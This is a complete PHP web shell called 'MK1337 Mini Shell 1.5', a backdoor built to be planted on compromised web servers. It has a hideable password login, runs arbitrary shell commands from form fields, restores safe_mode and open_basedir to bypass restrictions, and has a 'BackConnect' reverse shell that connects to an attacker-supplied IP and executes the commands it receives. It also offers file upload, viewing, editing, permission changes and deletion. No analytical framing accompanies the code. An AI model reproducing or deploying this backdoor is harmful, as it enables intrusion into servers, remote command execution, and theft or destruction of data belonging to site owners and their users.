<?php
@session_start();
@ob_start();
set_time_limit(0);
error_reporting(0);
header("X-XSS-Protection: 0");

$config = array();
$config['username'] 		= "mk1337"; // pw
$config['default_action'] 	= "filemanager"; // upload , php , command , server , filemanager.
$config['hidden_login']		= true;		// if true lite login be hidden and for accessing login page , u must add parameter in last filename like "shell.php?parameter" , for parameter config on the bellow
$config['parameter']		= 'mk'; // parameter for accessing login page if hidden_login true. "shell.php?lite_login" for default parameter.

define('ROOT',getcwd());
define('CURR_PATH',(empty($_GET['p'])) ? ROOT : $_GET['p']);
define('ACTION',(empty($_GET['a'])) ? $config['default_action'] : $_GET['a']);
define('DS',DIRECTORY_SEPARATOR);

// login form function
function form_login()
{
 echo "<style>body{background-color:black;}h3{ color:white;}</style><div style='margin-top:50px;'><center><img src='https://raw.githubusercontent.com/MataKucing-OFC/ShellBackDoor/main/banner(2).jpg'><h3>MK1337 Mini Shell 1.5</h3>";
  echo "<form method='post'><br><input type='password' name='username' placeholder='Password?' style='width:200px'><br><input type='submit' value='Login' name='login' style='width:200px'></form></center></div>";
}

// login authetication
if(empty($_SESSION['mk1337']) && !empty($config['username']))
{
if($config['hidden_login'] === true){
	
    form_login();
}else{
	form_login();
}
  if(isset($_POST['login']))
  {
   if($_POST['username'] == $config['username'])
   {
   	$_SESSION['mk1337'] = TRUE;
   	echo "<meta http-equiv='refresh' content='0;url=?login={$config['username']}'>";
   }  
  }
  exit;
}

?>
<?php


echo '<!DOCTYPE HTML>
<HTML>
<HEAD>
<link href="" rel="stylesheet" type="text/css">
<title>MK1337 Mni Shell</title>
<meta description="description" content="MK1337 MINI SHELL POWERFULL BYPASS">
<link rel="icon" type="image" href="https://g.top4top.io/p_2573ymkyq1.jpg">
<style>
body{
    font-family: "Special Elite";
    background-color: white ;
    position: relative;
    background-repeat: no-repeat;
    background-size: cover;
    font-color: white;
}   

#content tr:hover{
background-color: #636263;
text-shadow:0px 0px 10px #fff;
}
#content .first{
background-color: silver;
}
#content .first:hover{
background-color: silver;
text-shadow:0px 0px 1px #757575;
}
table{
border: 1px #000000 dotted;
}
H1{
font-family: "Rye", cursive;
}
a{
color: #000;
text-decoration: none;
}
a:hover{
color: ##116ed9;
text-shadow:0px 0px 10px #ffffff;
}
input,select,textarea{
border: 1px #000000 solid;
-moz-border-radius: 5px;
-webkit-border-radius:5px;
border-radius:5px;
}

</style>

<style>
@import url("https://fonts.googleapis.com/css2?family=Special+Elite");
</style>
<link rel="stylesheet" href="https://raw.githubusercontent.com/MataKucing-OFC/ShellBackDoor/main/ss/ss.css">
</HEAD>
<BODY>
<center><img width="300" src="https://raw.githubusercontent.com/MataKucing-OFC/ShellBackDoor/main/banner(2).jpg"></center>
<H1><center>MK1337 MINI SHELL BYPASS EVERYTHING!</center></H1>
<h2><center>Sebuah Duka yang Telah Menjadi LUKA</center></h2>
<div class="block w-full overflow-x-auto">

<table width="700" border="0" cellpadding="3" cellspacing="1" align="center" class="items-center bg-transparent w-full border-collapse ">
<tr>
 <td class="border-t-0 px-6 align-middle border-l-0 border-r-0 text-xs whitespace-nowrap p-4">

Path : ';
if(isset($_GET['path'])){
$path = $_GET['path'];
}else{
$path = getcwd();
}
$path = str_replace('\\','/',$path);
$paths = explode('/',$path);

foreach($paths as $id=>$pat){
if($pat == '' && $id == 0){
$a = true;
echo '<a href="?path=/">/</a>';
continue;
}

if($pat == '') continue;
echo '<a href="?path=';
for($i=0;$i<=$id;$i++){
echo "$paths[$i]";
if($i != $id) echo "/";
}
echo '">'.$pat.'</a>/';
}
echo '</td></tr><tr> <td class="border-t-0 px-6 align-middle border-l-0 border-r-0 text-xs whitespace-nowrap p-4">';

fputs ($mucx ,"\ng0t a shell.\n\n");
fputs($mucx , system("uname -a") .$zamazing0 );
fputs($mucx , system("pwd") .$zamazing0 );
fputs($mucx , system("id") .$zamazing0.$zamazing0 );
echo "<br>
           <br>
            <hr> 
            <b>BackConnect</b><br>
            <form method='POST' action=''><br> 
            Your IP & Port:<br> 
            <input type='text' name='ipim' size='15' value=''>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font color=white><b><font color='black'>Command </font><br>
            <input type='text' name='portum' size='5' value='21'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<b></font></b><input name='baba' type='text' class='inputz' size='34'>&nbsp;<input type='submit' class='inputzbut' value='Go'><br>
            <input type='submit' value='Connect'><br>
            
<br><pre></pre>
            </form>"; 
            ini_restore("safe_mode");
ini_restore("open_basedir");
$mkx=shell_exec($_POST[baba]); 
$lxp=shell_exec($_POST[mkx]); 
$uid=shell_exec('id');
$server=shell_exec('uname -a');
echo "<h4>";

echo $mkx;
echo $lxp;
echo "</h4></pre>";
         $ipim=$_POST['ipim']; 
         $portum=$_POST['portum']; 
         if ($ipim <> "") 
         { 
         $mucx=fsockopen($ipim , $portum , $errno, $errstr ); 
         if (!$mucx){ 
               $result = "Error: didnt connect !!!"; 
         } 
         else { 
         
         $zamazing0="\n";
                  
         fputs ($mucx ,"\nMK1337 BackConnect\n\n");
        //  fputs($mucx , system("uname -a") .$zamazing0 );
        //  fputs($mucx , system("pwd") .$zamazing0 );
        //  fputs($mucx , system("id") .$zamazing0.$zamazing0 );
         while(!feof($mucx)){  
       fputs ($mucx); 
       $one="[$";
       $two="]";
       $result= fgets ($mucx, 8192); 
      $message=`$result`; 
       fputs ($mucx, $one. ("MK1337 - LXPLOIT").$two. " " .$message."\n"); 
      } 
      fclose ($mucx); 
         } 
         } ?>
    
<?php
if(isset($_FILES['file'])){
if(copy($_FILES['file']['tmp_name'],$path.'/'.$_FILES['file']['name'])){
echo '<font color="green">File Upload Done.</font><br />';
}else{
echo '<font color="red">File Upload Error.</font><br />';
}
}
echo '<form enctype="multipart/form-data" method="POST">
Upload File : <input type="file" name="file" />
<input type="submit" value="upload" />
</form>
</td></tr>';
if(isset($_GET['filesrc'])){
echo "<tr> <td class='border-t-0 px-6 align-middle border-l-0 border-r-0 text-xs whitespace-nowrap p-4>Current File : ";
echo $_GET['filesrc'];
echo '</tr></td></table>    </div>
<br />';
echo('<pre>'.htmlspecialchars(file_get_contents($_GET['filesrc'])).'</pre>');
}elseif(isset($_GET['option']) && $_POST['opt'] != 'delete'){
echo '</table><br /><center>'.$_POST['path'].'<br /><br />';
if($_POST['opt'] == 'chmod'){
if(isset($_POST['perm'])){
if(chmod($_POST['path'],$_POST['perm'])){
echo '<font color="green">Change Permission Done.</font><br />';
}else{
echo '<font color="red">Change Permission Error.</font><br />';
}
}
echo '<form method="POST">
Permission : <input name="perm" type="text" size="4" value="'.substr(sprintf('%o', fileperms($_POST['path'])), -4).'" />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="chmod">
<input type="submit" value="Go" />
</form>';
}elseif($_POST['opt'] == 'rename'){
if(isset($_POST['newname'])){
if(rename($_POST['path'],$path.'/'.$_POST['newname'])){
echo '<font color="green">Change Name Done.</font><br />';
}else{
echo '<font color="red">Change Name Error.</font><br />';
}
$_POST['name'] = $_POST['newname'];
}
echo '<form method="POST">
New Name : <input name="newname" type="text" size="20" value="'.$_POST['name'].'" />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="rename">
<input type="submit" value="Go" />
</form>';
}elseif($_POST['opt'] == 'edit'){
if(isset($_POST['src'])){
$fp = fopen($_POST['path'],'w');
if(fwrite($fp,$_POST['src'])){
echo '<font color="green">Edit File Done.</font><br />';
}else{
echo '<font color="red">Edit File Error.</font><br />';
}
fclose($fp);
}
echo '<form method="POST">
<textarea cols=80 rows=20 name="src">'.htmlspecialchars(file_get_contents($_POST['path'])).'</textarea><br />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="edit">
<input type="submit" value="Go" />
</form>';
}
echo '</center>';
}else{
echo '</table><br /><center>';
if(isset($_GET['option']) && $_POST['opt'] == 'delete'){
if($_POST['type'] == 'dir'){
if(rmdir($_POST['path'])){
echo '<font color="green">Delete Dir Done.</font><br />';
}else{
echo '<font color="red">Delete Dir Error.</font><br />';
}
}elseif($_POST['type'] == 'file'){
if(unlink($_POST['path'])){
echo '<font color="green">Delete File Done.</font><br />';
}else{
echo '<font color="red">Delete File Error.</font><br />';
}
}
}
echo '</center>';
$scandir = scandir($path);
echo '<div id="content"><table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
<tr class="first">
 <td class="border-t-0 px-6 align-middle border-l-0 border-r-0 text-xs whitespace-nowrap p-4"><center>Name</center></td>
 <td class="border-t-0 px-6 align-middle border-l-0 border-r-0 text-xs whitespace-nowrap p-4"><center>Size</center></td>
 <td class="border-t-0 px-6 align-middle border-l-0 border-r-0 text-xs whitespace-nowrap p-4"><center>Permissions</center></td>
 <td class="border-t-0 px-6 align-middle border-l-0 border-r-0 text-xs whitespace-nowrap p-4"><center>Options</center></td>
</tr>';

foreach($scandir as $dir){
if(!is_dir("$path/$dir") || $dir == '.' || $dir == '..') continue;
echo "<tr>
 <td class='border-t-0 px-6 align-middle border-l-0 border-r-0 text-xs whitespace-nowrap p-4'><a href=\"?path=$path/$dir\">$dir</a></td>
 <td class='border-t-0 px-6 align-middle border-l-0 border-r-0 text-xs whitespace-nowrap p-4'><center>--</center></td>
 <td class='border-t-0 px-6 align-middle border-l-0 border-r-0 text-xs whitespace-nowrap p-4'><center>";
if(is_writable("$path/$dir")) echo '<font color="green">';
elseif(!is_readable("$path/$dir")) echo '<font color="red">';
echo perms("$path/$dir");
if(is_writable("$path/$dir") || !is_readable("$path/$dir")) echo '</font>';

echo "</center></td>
 <td class='border-t-0 px-6 align-middle border-l-0 border-r-0 text-xs whitespace-nowrap p-4'><center><form method=\"POST\" action=\"?option&path=$path\">
<select name=\"opt\">
<option value=\"\"></option>
<option value=\"delete\">Delete</option>
<option value=\"chmod\">Chmod</option>
<option value=\"rename\">Rename</option>
</select>
<input type=\"hidden\" name=\"type\" value=\"dir\">
<input type=\"hidden\" name=\"name\" value=\"$dir\">
<input type=\"hidden\" name=\"path\" value=\"$path/$dir\">
<input type=\"submit\" value=\">\" />
</form></center></td>
</tr>";
}
echo '<tr class="first"> <td class="border-t-0 px-6 align-middle border-l-0 border-r-0 text-xs whitespace-nowrap p-4"></td> <td class="border-t-0 px-6 align-middle border-l-0 border-r-0 text-xs whitespace-nowrap p-4"></td> <td class="border-t-0 px-6 align-middle border-l-0 border-r-0 text-xs whitespace-nowrap p-4"></td> <td class="border-t-0 px-6 align-middle border-l-0 border-r-0 text-xs whitespace-nowrap p-4"></td></tr>';
foreach($scandir as $file){
if(!is_file("$path/$file")) continue;
$size = filesize("$path/$file")/1024;
$size = round($size,3);
if($size >= 1024){
$size = round($size/1024,2).' MB';
}else{
$size = $size.' KB';
}

echo "<tr>
 <td class='border-t-0 px-6 align-middle border-l-0 border-r-0 text-xs whitespace-nowrap p-4'><a href=\"?filesrc=$path/$file&path=$path\">$file</a></td>
 <td class='border-t-0 px-6 align-middle border-l-0 border-r-0 text-xs whitespace-nowrap p-4'><center>".$size."</center></td>
 <td class='border-t-0 px-6 align-middle border-l-0 border-r-0 text-xs whitespace-nowrap p-4'><center>";
if(is_writable("$path/$file")) echo '<font color="green">';
elseif(!is_readable("$path/$file")) echo '<font color="red">';
echo perms("$path/$file");
if(is_writable("$path/$file") || !is_readable("$path/$file")) echo '</font>';
echo "</center></td>
 <td class='border-t-0 px-6 align-middle border-l-0 border-r-0 text-xs whitespace-nowrap p-4'><center><form method=\"POST\" action=\"?option&path=$path\">
<select name=\"opt\">
<option value=\"\"></option>
<option value=\"delete\">Delete</option>
<option value=\"chmod\">Chmod</option>
<option value=\"rename\">Rename</option>
<option value=\"edit\">Edit</option>
</select>
<input type=\"hidden\" name=\"type\" value=\"file\">
<input type=\"hidden\" name=\"name\" value=\"$file\">
<input type=\"hidden\" name=\"path\" value=\"$path/$file\">
<input type=\"submit\" value=\">\" />
</form></center></td>

</tr>";
}
echo '</table>
</div>';
}
echo '<br /><center>MK1337 MINI SHELL<font color="red">1.5 </font>LXPLOIT - CUKIMAY CYBER TEAM</font>

</BODY>

</HTML>';
function perms($file){
$perms = fileperms($file);

if (($perms & 0xC000) == 0xC000) {
// Socket
$info = 's';
} elseif (($perms & 0xA000) == 0xA000) {
// Symbolic Link
$info = 'l';
} elseif (($perms & 0x8000) == 0x8000) {
// Regular
$info = '-';
} elseif (($perms & 0x6000) == 0x6000) {
// Block special
$info = 'b';
} elseif (($perms & 0x4000) == 0x4000) {
// Directory
$info = 'd';
} elseif (($perms & 0x2000) == 0x2000) {
// Character special
$info = 'c';
} elseif (($perms & 0x1000) == 0x1000) {
// FIFO pipe
$info = 'p';
} else {
// Unknown
$info = 'u';
}

// Owner
$info .= (($perms & 0x0100) ? 'r' : '-');
$info .= (($perms & 0x0080) ? 'w' : '-');
$info .= (($perms & 0x0040) ?
(($perms & 0x0800) ? 's' : 'x' ) :
(($perms & 0x0800) ? 'S' : '-'));

// Group
$info .= (($perms & 0x0020) ? 'r' : '-');
$info .= (($perms & 0x0010) ? 'w' : '-');
$info .= (($perms & 0x0008) ?
(($perms & 0x0400) ? 's' : 'x' ) :
(($perms & 0x0400) ? 'S' : '-'));

// World
$info .= (($perms & 0x0004) ? 'r' : '-');
$info .= (($perms & 0x0002) ? 'w' : '-');
$info .= (($perms & 0x0001) ?
(($perms & 0x0200) ? 't' : 'x' ) :
(($perms & 0x0200) ? 'T' : '-'));

return $info;
}
?>